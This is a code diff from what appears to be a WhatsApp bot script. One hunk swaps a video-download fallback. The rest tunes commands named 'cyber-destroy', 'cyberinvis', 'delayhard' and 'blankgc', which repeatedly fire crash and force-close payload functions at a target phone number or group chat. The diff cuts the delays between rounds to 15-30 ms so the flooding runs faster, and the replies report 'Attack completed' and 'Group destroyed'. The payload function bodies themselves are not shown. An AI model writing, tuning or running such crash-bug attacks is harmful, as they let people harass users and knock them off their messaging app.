@@ -11085,16 +11085,14 @@ case 'ytvideo': {
             }
             throw new Error('vreden: no url');
         },
-        // 4) ytdl-core direct (last resort)
+        // 4) VidsSave best_video fallback (any quality)
         async (url, quality) => {
-            try {
-                const info = await ytdl.getInfo(url);
-                const itag = _qToItag[quality] || 18;
-                let fmt = info.formats.find(f => f.itag === itag && f.url);
-                if (!fmt) fmt = ytdl.chooseFormat(info.formats, { quality: 'highest', filter: 'audioandvideo' });
-                if (!fmt?.url) throw new Error('ytdl: no format');
-                return { title: info.videoDetails?.title || 'video', quality, download_url: fmt.url };
-            } catch (e) { throw new Error('ytdl: ' + e.message); }
+            const result = await ytDownload(url);
+            const bv = result?.data?.best_video;
+            if (bv?.download_url) return { title: result.data.title || 'video', quality: bv.quality || quality, download_url: bv.download_url };
+            const vf = result?.data?.video_formats;
+            if (vf && vf.length > 0) return { title: result.data.title || 'video', quality: vf[0].quality || quality, download_url: vf[0].download_url };
+            throw new Error('vidssave-all: no video found');
         }
     ];
     const _dlVideo = async (url, quality = '720p') => {
@@ -14008,21 +14006,21 @@ case 'cyber-destroy': {
 
     try {
         await CYBEReress();
-        await sleep(150);
+        await sleep(30);
         for (let round = 0; round < 10; round++) {
             await Combo(target);
-            await sleep(150);
+            await sleep(25);
             await fcnew(target);
-            await sleep(150);
+            await sleep(25);
             await XPhone(target);
-            await sleep(150);
+            await sleep(25);
             await BayuOfficialHard(target);
-            await sleep(150);
+            await sleep(25);
             for (let i = 0; i < 30; i++) {
                 await ForceClose(target);
-                await sleep(80);
+                await sleep(15);
             }
-            await sleep(200);
+            await sleep(30);
         }
 
         reply(`✅ *CYBER-DESTROY complete — 10 rounds done on ${targetNumber}*`);
@@ -14052,25 +14050,25 @@ case "cyberinvis": {
 
     try {
         await CYBEReress();
-        await sleep(200);
+        await sleep(30);
         for (let round = 0; round < 10; round++) {
             await Combo(target);
-            await sleep(200);
+            await sleep(30);
             await fcnew(target);
-            await sleep(200);
+            await sleep(30);
             await Combo(target);
-            await sleep(200);
+            await sleep(30);
             await fcnew(target);
-            await sleep(200);
+            await sleep(30);
             await XPhone(target);
-            await sleep(200);
+            await sleep(30);
             await BayuOfficialHard(target);
-            await sleep(200);
+            await sleep(30);
             for (let j = 0; j < 10; j++) {
                 await ForceClose(target);
-                await sleep(100);
+                await sleep(20);
             }
-            await sleep(200);
+            await sleep(30);
         }
         reply(`✅ *Attack completed on ${pepec}*`);
     } catch(e) {
@@ -14098,25 +14096,25 @@ case "delayhard": {
 
     try {
         await CYBEReress();
-        await sleep(150);
+        await sleep(25);
         for (let round = 0; round < 10; round++) {
             await fcnew(target);
-            await sleep(150);
+            await sleep(25);
             await fcnew(target);
-            await sleep(150);
+            await sleep(25);
             await Combo(target);
-            await sleep(150);
+            await sleep(25);
             await Combo(target);
-            await sleep(150);
+            await sleep(25);
             await XPhone(target);
-            await sleep(150);
+            await sleep(25);
             await BayuOfficialHard(target);
-            await sleep(150);
+            await sleep(25);
             for (let i = 0; i < 15; i++) {
                 await ForceClose(target);
-                await sleep(80);
+                await sleep(15);
             }
-            await sleep(150);
+            await sleep(25);
         }
         reply(`✅ *DELAYHARD complete on ${pepec}*`);
     } catch(e) {
@@ -14192,13 +14190,13 @@ case 'blankgc': {
     try {
         for (let i = 0; i < 100; i++) {
             await bug3(m.chat);
-            await sleep(400);
+            await sleep(30);
             await bug3(m.chat);
-            await sleep(400);
+            await sleep(30);
             await bug3(m.chat);
-            await sleep(300);
+            await sleep(30);
             await VampireBugIns(m.chat);
-            await sleep(300);
+            await sleep(30);
         }
         reply(`✅ *Group destroyed — ${command} complete*`);
     } catch(e) {
